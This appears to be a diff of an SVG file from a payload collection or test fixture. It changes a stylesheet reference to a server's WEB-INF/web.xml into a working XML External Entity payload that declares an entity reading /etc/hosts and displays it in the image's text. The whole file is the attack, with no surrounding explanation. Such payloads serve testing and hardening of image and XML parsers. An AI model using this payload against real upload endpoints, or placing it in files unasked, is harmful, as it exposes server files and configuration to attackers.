@@ -1,6 +1,10 @@
-<?xml version="1.0" ?>
-<?xml-stylesheet href="file:///home/sas/dad/AdventNet/Sas/tomcat/webapps/ROOT/WEB-INF/web.xml" type="text/xml" ?>
-<svg width="10cm" height="5cm"
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+  <!-- an internal subset can be embedded here -->
+  <!ENTITY xxe SYSTEM "/etc/hosts">
+]>
+<svg width="100%" height="100%" viewBox="0 0 100 100"
      xmlns="http://www.w3.org/2000/svg">
-  <rect x="2cm" y="1cm" width="6cm" height="3cm"/>
+  <text x="20" y="35">My &xxe;</text>
 </svg>
